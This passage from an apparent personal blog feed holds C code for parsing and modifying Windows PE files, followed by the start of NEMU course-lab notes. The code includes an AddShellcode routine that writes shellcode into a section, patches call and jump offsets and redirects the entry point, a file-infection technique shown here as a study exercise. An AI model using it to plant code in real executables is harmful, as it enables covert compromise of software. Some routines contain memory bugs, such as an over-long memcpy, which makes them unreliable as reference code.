fread(Filebuffer, size, <span class="number">1</span>, PE);</span><br><span class="line">    *pointer = Filebuffer;</span><br><span class="line">    Filebuffer = <span class="literal">NULL</span>;</span><br><span class="line">    fclose(PE);</span><br><span class="line">    <span class="keyword">return</span> size;</span><br><span class="line">&#125;</span><br><span class="line">DWORD <span class="title function_">FileToImage</span><span class="params">(IN <span class="type">const</span> <span class="type">void</span>* Filept, OUT <span class="type">void</span>** Imagept)</span> &#123;</span><br><span class="line">    PIMAGE_DOS_HEADER PimageDosHeader = <span class="literal">NULL</span>;</span><br><span class="line">    PIMAGE_NT_HEADERS PNtHeads = <span class="literal">NULL</span>;</span><br><span class="line">    PIMAGE_SECTION_HEADER PSectionHeader = <span class="literal">NULL</span>;</span><br><span class="line">    PimageDosHeader = (PIMAGE_DOS_HEADER)Filept;</span><br><span class="line">    <span class="keyword">if</span> (*(PWORD)PimageDosHeader != IMAGE_DOS_SIGNATURE) &#123;</span><br><span class="line">        <span class="built_in">fputs</span>(<span class="string">&quot;not PE&quot;</span>, <span class="built_in">stderr</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">2</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    PNtHeads = (PIMAGE_NT_HEADERS)((<span class="type">char</span>*)Filept + PimageDosHeader-&gt;e_lfanew);</span><br><span class="line">    <span class="keyword">if</span> (*(PDWORD)PNtHeads != IMAGE_NT_SIGNATURE) &#123;</span><br><span class="line">        <span class="built_in">fputs</span>(<span class="string">&quot;not PE&quot;</span>, <span class="built_in">stderr</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">3</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    PSectionHeader = (PIMAGE_SECTION_HEADER)((<span class="type">char</span>*)Filept + PimageDosHeader-&gt;e_lfanew + PNtHeads-&gt;FileHeader.SizeOfOptionalHeader + IMAGE_SIZEOF_FILE_HEADER + <span class="number">4</span>);<span class="comment">//peFILEHEADERpeOPTIONHEADERPE</span></span><br><span class="line">    <span class="type">void</span>* PImagetemp = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="type">size_t</span> size = PNtHeads-&gt;OptionalHeader.SizeOfImage;</span><br><span class="line">    PImagetemp = <span class="built_in">malloc</span>(size);</span><br><span class="line">    <span class="built_in">memset</span>(PImagetemp, <span class="number">0</span>, size);</span><br><span class="line">    <span class="built_in">memcpy</span>(PImagetemp, Filept, PNtHeads-&gt;OptionalHeader.SizeOfHeaders);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; PNtHeads-&gt;FileHeader.NumberOfSections; i++, PSectionHeader++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (DEBUG)</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;FileToImage%x\n&quot;</span>, PSectionHeader-&gt;VirtualAddress);</span><br><span class="line">        <span class="built_in">memcpy</span>((<span class="type">void</span>*)((<span class="type">char</span>*)PImagetemp + PSectionHeader-&gt;VirtualAddress), (<span class="type">void</span>*)((<span class="type">char</span>*)Filept + PSectionHeader-&gt;PointerToRawData), PSectionHeader-&gt;SizeOfRawData);</span><br><span class="line">    &#125;</span><br><span class="line">    *Imagept = PImagetemp;</span><br><span class="line">    PImagetemp = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">return</span> PNtHeads-&gt;OptionalHeader.SizeOfImage;</span><br><span class="line">&#125;</span><br><span class="line">DWORD <span class="title function_">ImageToFile</span><span class="params">(IN <span class="type">const</span> <span class="type">void</span>* Imagept, OUT <span class="type">void</span>** Filept)</span> &#123;</span><br><span class="line">    <span class="type">size_t</span> size = <span class="number">0</span>;</span><br><span class="line">    <span class="type">void</span>* Filebuffer;</span><br><span class="line">    PIMAGE_DOS_HEADER PimageDosHeader = <span class="literal">NULL</span>;</span><br><span class="line">    PIMAGE_NT_HEADERS PNtHeads = <span class="literal">NULL</span>;</span><br><span class="line">    PIMAGE_SECTION_HEADER PSectionHeader = <span class="literal">NULL</span>;</span><br><span class="line">    PimageDosHeader = (PIMAGE_DOS_HEADER)Imagept;</span><br><span class="line">    <span class="keyword">if</span> (*(PWORD)PimageDosHeader != IMAGE_DOS_SIGNATURE) &#123;</span><br><span class="line">        <span class="built_in">fputs</span>(<span class="string">&quot;not PE&quot;</span>, <span class="built_in">stderr</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">2</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    PNtHeads = (PIMAGE_NT_HEADERS)((<span class="type">char</span>*)Imagept + PimageDosHeader-&gt;e_lfanew);</span><br><span class="line">    <span class="keyword">if</span> (*(PDWORD)PNtHeads != IMAGE_NT_SIGNATURE) &#123;</span><br><span class="line">        <span class="built_in">fputs</span>(<span class="string">&quot;not PE&quot;</span>, <span class="built_in">stderr</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">3</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    PSectionHeader = (PIMAGE_SECTION_HEADER)((<span class="type">char</span>*)Imagept + <span class="number">4</span> + IMAGE_SIZEOF_FILE_HEADER + PimageDosHeader-&gt;e_lfanew + PNtHeads-&gt;FileHeader.SizeOfOptionalHeader);</span><br><span class="line">    size = PNtHeads-&gt;OptionalHeader.SizeOfHeaders;</span><br><span class="line">    PIMAGE_SECTION_HEADER tempPsection = PSectionHeader;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; PNtHeads-&gt;FileHeader.NumberOfSections; ++tempPsection, ++i) &#123;</span><br><span class="line">        size += tempPsection-&gt;SizeOfRawData;</span><br><span class="line">    &#125;</span><br><span class="line">    Filebuffer = <span class="built_in">malloc</span>(size);</span><br><span class="line">    <span class="built_in">memset</span>(Filebuffer, <span class="number">0</span>, size);</span><br><span class="line">    <span class="built_in">memcpy</span>(Filebuffer, Imagept, PNtHeads-&gt;OptionalHeader.SizeOfHeaders);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; PNtHeads-&gt;FileHeader.NumberOfSections; ++PSectionHeader, ++i) &#123;</span><br><span class="line">        <span class="keyword">if</span> (DEBUG)</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;ImageToFile%x\n&quot;</span>, PSectionHeader-&gt;PointerToRawData);</span><br><span class="line">        <span class="built_in">memcpy</span>((<span class="type">void</span>*)((<span class="type">char</span>*)Filebuffer + PSectionHeader-&gt;PointerToRawData), (<span class="type">void</span>*)((<span class="type">char</span>*)Imagept + PSectionHeader-&gt;VirtualAddress), PSectionHeader-&gt;SizeOfRawData);</span><br><span class="line">    &#125;</span><br><span class="line">    *Filept = Filebuffer;</span><br><span class="line">    Filebuffer = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">return</span> size;</span><br><span class="line">&#125;</span><br><span class="line">DWORD <span class="title function_">FilebufferCopytoPe</span><span class="params">(IN <span class="type">const</span> <span class="type">char</span>* name, <span class="type">size_t</span> size, <span class="type">const</span> <span class="type">void</span>* Filept)</span> &#123;</span><br><span class="line">    FILE* tempfp;</span><br><span class="line">    tempfp = fopen(name, <span class="string">&quot;wb&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (<span class="literal">NULL</span> == tempfp) &#123;</span><br><span class="line">        <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;file open PE %s&quot;</span>, name);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    fwrite(Filept, size, <span class="number">1</span>, tempfp);</span><br><span class="line">    fclose(tempfp);</span><br><span class="line">    <span class="keyword">return</span> size;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">AddShellcode</span><span class="params">(IN <span class="type">void</span>* filebuffer)</span> &#123;</span><br><span class="line"></span><br><span class="line">    PIMAGE_DOS_HEADER PDosHeader = <span class="literal">NULL</span>;</span><br><span class="line">    PIMAGE_NT_HEADERS PNtHeaders = <span class="literal">NULL</span>;</span><br><span class="line">    PIMAGE_SECTION_HEADER PSectionHeader = <span class="literal">NULL</span>;</span><br><span class="line">    PDosHeader = (PIMAGE_DOS_HEADER)filebuffer;</span><br><span class="line">    <span class="keyword">if</span> (*(PWORD)PDosHeader != IMAGE_DOS_SIGNATURE) &#123;</span><br><span class="line">        <span class="built_in">fputs</span>(<span class="string">&quot;not PE&quot;</span>, <span class="built_in">stderr</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    PNtHeaders = (<span class="type">void</span>*)((<span class="type">char</span>*)filebuffer + PDosHeader-&gt;e_lfanew);</span><br><span class="line">    <span class="keyword">if</span> (*(PDWORD)(PNtHeaders) != IMAGE_NT_SIGNATURE) &#123;</span><br><span class="line">        <span class="built_in">fputs</span>(<span class="string">&quot;not PE&quot;</span>, <span class="built_in">stderr</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">2</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    PSectionHeader = (PIMAGE_SECTION_HEADER)((<span class="type">char</span>*)filebuffer + <span class="number">4</span> + IMAGE_SIZEOF_FILE_HEADER + PNtHeaders-&gt;FileHeader.SizeOfOptionalHeader + PDosHeader-&gt;e_lfanew);</span><br><span class="line">    <span class="comment">//PSectionHeader = (PIMAGE_SECTION_HEADER)((char*)Filept + PimageDosHeader-&gt;e_lfanew + PNtHeads-&gt;FileHeader.SizeOfOptionalHeader + IMAGE_SIZEOF_FILE_HEADER + 4);</span></span><br><span class="line">    <span class="keyword">if</span> ((PSectionHeader-&gt;SizeOfRawData - *(PDWORD)PSectionHeader) &lt; size) &#123;</span><br><span class="line">        <span class="built_in">fputs</span>(<span class="string">&quot;to small&quot;</span>, <span class="built_in">stderr</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">3</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    DWORD jmpaddress;</span><br><span class="line">    DWORD calladdress;</span><br><span class="line">    DWORD newenterypointer = PSectionHeader-&gt;VirtualAddress + PSectionHeader-&gt;Misc.VirtualSize + <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">if</span> (DEBUG) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;PSectionHeader-&gt;PointerToRawData%x\nPSectionHeader-&gt;Misc.VirtualSize%x\n&quot;</span>, PSectionHeader-&gt;PointerToRawData, PSectionHeader-&gt;Misc.VirtualSize);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//DWORD newenterypointer = 0x1a723;</span></span><br><span class="line"></span><br><span class="line">    calladdress = <span class="number">0x7672A820</span> - (<span class="number">8</span> + newenterypointer + <span class="number">5</span> + PNtHeaders-&gt;OptionalHeader.ImageBase);</span><br><span class="line">    jmpaddress = PNtHeaders-&gt;OptionalHeader.AddressOfEntryPoint - (PSectionHeader-&gt;VirtualAddress + PSectionHeader-&gt;Misc.VirtualSize + <span class="number">1</span> + <span class="number">8</span> + <span class="number">5</span> + <span class="number">5</span>);</span><br><span class="line">    <span class="comment">//addressofneters</span></span><br><span class="line">    <span class="keyword">if</span> (DEBUG) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;call:%x\njmp:%x\n&quot;</span>, calladdress, jmpaddress);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;size:%d\n&quot;</span>, size);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">memcpy</span>(&amp;shellcode[<span class="number">9</span>], &amp;calladdress, <span class="number">4</span>);</span><br><span class="line">    <span class="built_in">memcpy</span>(&amp;shellcode[<span class="number">14</span>], &amp;jmpaddress, <span class="number">4</span>);</span><br><span class="line">    <span class="comment">//printf(&quot;size:%d\n&quot;, size);</span></span><br><span class="line">    PNtHeaders-&gt;OptionalHeader.AddressOfEntryPoint = newenterypointer;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">memcpy</span>(((<span class="type">char</span>*)(filebuffer)+PSectionHeader-&gt;PointerToRawData + PSectionHeader-&gt;Misc.VirtualSize + <span class="number">1</span>), shellcode, size);</span><br><span class="line">    <span class="keyword">if</span> (DEBUG) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;size:%d\n&quot;</span>, size);</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">16</span>; ++i) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%X  &quot;</span>, shellcode[i]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">putchar</span>(<span class="string">&#x27;\n&#x27;</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%x&quot;</span>, newenterypointer);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">size_t</span> <span class="title function_">AddANewSection</span><span class="params">(IN <span class="type">void</span>* filebuffer, IN <span class="type">size_t</span> sizeoffilebuffer, OUT <span class="type">void</span>** newfilebuffer)</span> &#123;</span><br><span class="line">    PIMAGE_DOS_HEADER PDosHeader = <span class="literal">NULL</span>;</span><br><span class="line">    PIMAGE_NT_HEADERS PNtHeaders = <span class="literal">NULL</span>;</span><br><span class="line">    PIMAGE_SECTION_HEADER PSectionHeader = <span class="literal">NULL</span>;</span><br><span class="line">    PIMAGE_SECTION_HEADER LastSectionHeader = <span class="literal">NULL</span>;</span><br><span class="line">    PDosHeader = (PIMAGE_DOS_HEADER)filebuffer;</span><br><span class="line">    <span class="keyword">if</span> (*(PWORD)PDosHeader != IMAGE_DOS_SIGNATURE) &#123;</span><br><span class="line">        <span class="built_in">fputs</span>(<span class="string">&quot;not PE&quot;</span>, <span class="built_in">stderr</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    PNtHeaders = (<span class="type">void</span>*)((<span class="type">char</span>*)filebuffer + PDosHeader-&gt;e_lfanew);</span><br><span class="line">    <span class="keyword">if</span> (*(PDWORD)(PNtHeaders) != IMAGE_NT_SIGNATURE) &#123;</span><br><span class="line">        <span class="built_in">fputs</span>(<span class="string">&quot;not PE&quot;</span>, <span class="built_in">stderr</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">2</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    PSectionHeader = (PIMAGE_SECTION_HEADER)((<span class="type">char</span>*)filebuffer + <span class="number">4</span> + IMAGE_SIZEOF_FILE_HEADER + PNtHeaders-&gt;FileHeader.SizeOfOptionalHeader + PDosHeader-&gt;e_lfanew);</span><br><span class="line">    DWORD sectionsize = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; PNtHeaders-&gt;FileHeader.NumberOfSections; ++i) &#123;</span><br><span class="line">        sectionsize += IMAGE_SIZEOF_SECTION_HEADER;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ((PNtHeaders-&gt;OptionalHeader.SizeOfHeaders - sectionsize - IMAGE_SIZEOF_FILE_HEADER - PNtHeaders-&gt;FileHeader.SizeOfOptionalHeader - PDosHeader-&gt;e_lfanew - <span class="number">4</span>) &lt; (<span class="number">2</span> * IMAGE_SIZEOF_SECTION_HEADER)) &#123;</span><br><span class="line">        <span class="built_in">fputs</span>(<span class="string">&quot;size too small&quot;</span>, <span class="built_in">stderr</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    PNtHeaders-&gt;OptionalHeader.SizeOfImage += AddNewSectionSize;</span><br><span class="line">    PNtHeaders-&gt;FileHeader.NumberOfSections += <span class="number">1</span>;</span><br><span class="line">    <span class="type">size_t</span> newfile_size = sizeoffilebuffer + AddNewSectionSize;</span><br><span class="line">    <span class="type">void</span>* tempnewfilebuffer = <span class="built_in">malloc</span>(newfile_size);<span class="comment">//</span></span><br><span class="line">    <span class="built_in">memset</span>(tempnewfilebuffer, <span class="number">0</span>, newfile_size);</span><br><span class="line">    <span class="built_in">memcpy</span>(tempnewfilebuffer, filebuffer, sizeoffilebuffer);</span><br><span class="line">    IMAGE_SECTION_HEADER sectionsource;</span><br><span class="line">    <span class="built_in">memcpy</span>(&amp;sectionsource, PSectionHeader, IMAGE_SIZEOF_SECTION_HEADER);</span><br><span class="line">    PIMAGE_SECTION_HEADER Psectionsource = &amp;sectionsource;</span><br><span class="line">    <span class="comment">//printf(&quot;%p,%p  &quot; ,&amp; sectionsource,Psectionsource);</span></span><br><span class="line">    <span class="built_in">memcpy</span>(&amp;sectionsource, <span class="string">&quot;.grxer&quot;</span>, <span class="keyword">sizeof</span>(<span class="string">&quot;.grxer&quot;</span>));</span><br><span class="line">    <span class="comment">//(char*)Psectionsource = &quot;.grr&quot;;//lea</span></span><br><span class="line">    <span class="comment">//printf(&quot;%p,%p&quot;, &amp;sectionsource, Psectionsource);</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%s&quot;</span>, sectionsource.Name);</span><br><span class="line">    sectionsource.Misc.VirtualSize = AddNewSectionSize;</span><br><span class="line">    <span class="comment">//LastSectionHeader =(PSectionHeader + PNtHeaders-&gt;FileHeader.NumberOfSections - 2);</span></span><br><span class="line">    LastSectionHeader = &amp;PSectionHeader[PNtHeaders-&gt;FileHeader.NumberOfSections - <span class="number">1</span>];</span><br><span class="line">    sectionsource.VirtualAddress = LastSectionHeader-&gt;VirtualAddress + LastSectionHeader-&gt;SizeOfRawData;<span class="comment">//there should use the max of SizeOfRawData and VirtualSize</span></span><br><span class="line">    sectionsource.SizeOfRawData = AddNewSectionSize;</span><br><span class="line">    sectionsource.PointerToRawData = LastSectionHeader-&gt;PointerToRawData + LastSectionHeader-&gt;SizeOfRawData;</span><br><span class="line">    <span class="keyword">if</span> (DEBUG) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>, sectionsource.VirtualAddress);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">memcpy</span>(((<span class="type">char</span>*)tempnewfilebuffer + sectionsize + IMAGE_SIZEOF_FILE_HEADER + PNtHeaders-&gt;FileHeader.SizeOfOptionalHeader + PDosHeader-&gt;e_lfanew + <span class="number">4</span>), &amp;sectionsource, IMAGE_SIZEOF_SECTION_HEADER);</span><br><span class="line">    *newfilebuffer = tempnewfilebuffer;</span><br><span class="line">    tempnewfilebuffer = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">return</span> newfile_size;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">size_t</span> <span class="title function_">ExpandTheLastSection</span><span class="params">(IN <span class="type">void</span>* filebuffer, IN <span class="type">size_t</span> sizeoffilebuffer, OUT <span class="type">void</span>** newfilebuffer)</span> &#123;</span><br><span class="line">    PIMAGE_DOS_HEADER PDosHeader = <span class="literal">NULL</span>;</span><br><span class="line">    PIMAGE_NT_HEADERS PNtHeaders = <span class="literal">NULL</span>;</span><br><span class="line">    PIMAGE_SECTION_HEADER PSectionHeader = <span class="literal">NULL</span>;</span><br><span class="line">    PDosHeader = (PIMAGE_DOS_HEADER)filebuffer;</span><br><span class="line">    PIMAGE_SECTION_HEADER PLastSectionHeader = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">if</span> (*(PWORD)PDosHeader != IMAGE_DOS_SIGNATURE) &#123;</span><br><span class="line">        <span class="built_in">fputs</span>(<span class="string">&quot;not PE&quot;</span>, <span class="built_in">stderr</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    PNtHeaders = (<span class="type">void</span>*)((<span class="type">char</span>*)filebuffer + PDosHeader-&gt;e_lfanew);</span><br><span class="line">    <span class="keyword">if</span> (*(PDWORD)(PNtHeaders) != IMAGE_NT_SIGNATURE) &#123;</span><br><span class="line">        <span class="built_in">fputs</span>(<span class="string">&quot;not PE&quot;</span>, <span class="built_in">stderr</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">2</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    PSectionHeader = (PIMAGE_SECTION_HEADER)((<span class="type">char</span>*)filebuffer + <span class="number">4</span> + IMAGE_SIZEOF_FILE_HEADER + PNtHeaders-&gt;FileHeader.SizeOfOptionalHeader + PDosHeader-&gt;e_lfanew);</span><br><span class="line">    PLastSectionHeader = &amp;PSectionHeader[PNtHeaders-&gt;FileHeader.NumberOfSections - <span class="number">1</span>];</span><br><span class="line">    <span class="type">size_t</span> finaddsize = (ExpandSectionSize / PNtHeaders-&gt;OptionalHeader.SectionAlignment) * PNtHeaders-&gt;OptionalHeader.SectionAlignment;</span><br><span class="line">    <span class="keyword">if</span> ((ExpandSectionSize - finaddsize) &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        finaddsize += PNtHeaders-&gt;OptionalHeader.SectionAlignment;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">size_t</span> newfilebuffersize = sizeoffilebuffer + finaddsize;</span><br><span class="line">    <span class="type">void</span>* tempnewfilebuffer = <span class="built_in">malloc</span>(newfilebuffersize);</span><br><span class="line">    <span class="built_in">memset</span>(tempnewfilebuffer, <span class="number">0</span>, newfilebuffersize);</span><br><span class="line">    <span class="comment">// </span></span><br><span class="line">    PLastSectionHeader-&gt;SizeOfRawData += finaddsize;</span><br><span class="line">    PLastSectionHeader-&gt;Misc.VirtualSize += finaddsize;</span><br><span class="line">    <span class="comment">// sizeofiimage</span></span><br><span class="line">    PNtHeaders-&gt;OptionalHeader.SizeOfImage += finaddsize;</span><br><span class="line">    <span class="comment">//</span></span><br><span class="line">    PLastSectionHeader-&gt;Characteristics |= PSectionHeader-&gt;Characteristics;</span><br><span class="line">    <span class="comment">//copy</span></span><br><span class="line">    <span class="built_in">memcpy</span>(tempnewfilebuffer, filebuffer, newfilebuffersize);</span><br><span class="line">    *newfilebuffer = tempnewfilebuffer;</span><br><span class="line">    tempnewfilebuffer = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;add %x byte&quot;</span>, finaddsize);</span><br><span class="line">    <span class="keyword">return</span> newfilebuffersize;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> PE </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>x86 NEMU PA1</title>
      <link href="/2023/05/13/x86-nemu-pa1/"/>
      <url>/2023/05/13/x86-nemu-pa1/</url>
      
        <content type="html"><![CDATA[<h1 id="NEMU-PA1"><a href="#NEMU-PA1" class="headerlink" title="NEMU PA1"></a>NEMU PA1</h1><p><a href="https://nju-projectn.github.io/ics-pa-gitbook/ics2020/PA1.html">https://nju-projectn.github.io/ics-pa-gitbook/ics2020/PA1.html</a></p><p>bashfish</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">export NEMU_HOME=/mnt/hgfs/share/ics2020/nemu</span><br><span class="line">export AM_HOME=/mnt/hgfs/share/ics2020/abstract-machine</span><br><span class="line">source ~/.config/fish/config.fish</span><br></pre></td></tr></table></figure><p>abstruct machine change SIGSTKSZ to 8192</p><p>vscode c_cpp_properties.json</p><p>make -nB</p><ul><li>-n </li><li>-B  always-make make </li></ul><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">grxer@Ubuntu22 /m/h/s/i/nemu (pa1)&gt; make ARCH=x86-nemu ALL=dummy run -nB</span><br><span class="line">gcc -D__DIFF_REF_KVM__ -O2 -MMD -Wall -Werror -ggdb3 -I./include -I./src/engine/interpreter -D__ENGINE_interpreter__ -D__ISA__=x86 -D__ISA_x86__ -D_ISA_H_=\<span class="string">&quot;isa/x86.h\&quot;  -c -o build/obj-x86-interpreter/monitor/monitor.o src/monitor/monitor.c</span></span><br><span class="line"><span class="string">echo + CC src/isa/x86/decode.c</span></span><br></pre></td></tr></table></figure><figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="comment">//c_cpp_properties.json</span></span><br><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;configurations&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">        <span class="punctuation">&#123;</span></span><br><span class="line">            <span class="attr">&quot;name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Linux&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;includePath&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">                <span class="string">&quot;$&#123;workspaceFolder&#125;/**&quot;</span></span><br><span class="line">            <span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;defines&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">                <span class="string">&quot;__DIFF_REF_KVM__&quot;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="string">&quot;__ENGINE_interpreter__&quot;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="string">&quot;__ISA__=x86 &quot;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="string">&quot;__ISA_x86__&quot;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="string">&quot;_ISA_H_=\&quot;isa/x86.h\&quot;&quot;</span></span><br><span class="line">            <span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;compilerPath&quot;</span><span class="punctuation">:</span> <span class="string">&quot;/usr/bin/gcc&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;cStandard&quot;</span><span class="punctuation">:</span> <span class="string">&quot;c17&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;cppStandard&quot;</span><span class="punctuation">:</span> <span class="string">&quot;gnu++17&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;intelliSenseMode&quot;</span><span class="punctuation">:</span> <span class="string">&quot;linux-gcc-x64&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;configurationProvider&quot;</span><span class="punctuation">:</span> <span class="string">&quot;ms-vscode.makefile-tools&quot;</span></span><br><span class="line">        <span class="punctuation">&#125;</span></span><br><span class="line">    <span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;version&quot;</span><span class="punctuation">:</span> <span class="number">4</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p><strong>clangd bear make</strong></p><p>makefile</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">pip install compiledb</span><br><span class="line">compiledb -n make ARCH=x86-nemu ALL=dummy</span><br><span class="line"><span class="comment">//-n no-build</span></span><br></pre></td></tr></table></figure><p>pa:)</p><h2 id=""><a href="#" class="headerlink" title=""></a></h2><p>unionstruct</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Do NOT change the order of the GPRs&#x27; definitions. */</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* In NEMU, rtlreg_t is exactly uint32_t. This makes RTL instructions</span></span><br><span class="line"><span class="comment">   * in PA2 able to directly access these registers.</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line">  <span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">      <span class="type">uint32_t</span> _32;</span><br><span class="line">      <span class="type">uint16_t</span> _16;</span><br><span class="line">      <span class="type">uint8_t</span> _8[<span class="number">2</span>];</span><br><span class="line">    &#125; gpr[<span class="number">8</span>];</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">      <span class="type">rtlreg_t</span> eax, ecx, edx, ebx, esp, ebp, esi, edi;</span><br><span class="line">    &#125;;</span><br><span class="line">  &#125;;</span><br><span class="line">  <span class="type">vaddr_t</span> pc;</span><br><span class="line">&#125; x86_CPU_state;</span><br></pre></td></tr></table></figure><h2 id="assert"><a href="#assert" class="headerlink" title="assert"></a>assert</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> assert(cond) <span class="keyword">if</span> (!(cond)) panic(...);</span></span><br></pre></td></tr></table></figure><p></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (...) assert(xxx); <span class="comment">// assert</span></span><br><span class="line"><span class="keyword">else</span> ...</span><br></pre></td></tr></table></figure><p>assertelseifif</p><p>nemu</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> assert(cond) \</span></span><br><span class="line"><span class="meta">  do &#123; \</span></span><br><span class="line"><span class="meta">    <span class="keyword">if</span> (!(cond)) &#123; \</span></span><br><span class="line"><span class="meta">      fprintf(stderr, <span class="string">&quot;Fail @ %s:%d&quot;</span>, __FILE__, __LINE__); \</span></span><br><span class="line"><span class="meta">      exit(1); \</span></span><br><span class="line"><span class="meta">    &#125; \</span></span><br><span class="line"><span class="meta">  &#125; while (0)</span></span><br></pre></td></tr></table></figure><p>GNUC<code>(&#123; ... &#125;)</code>,c</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> assert(cond) (&#123; ... &#125;)</span></span><br></pre></td></tr></table></figure><p>glibc2.35<code>#define assert(cond) if (!(cond)) panic(...);</code>else</p><h2 id="info-r"><a href="#info-r" class="headerlink" title="info r"></a>info r</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span 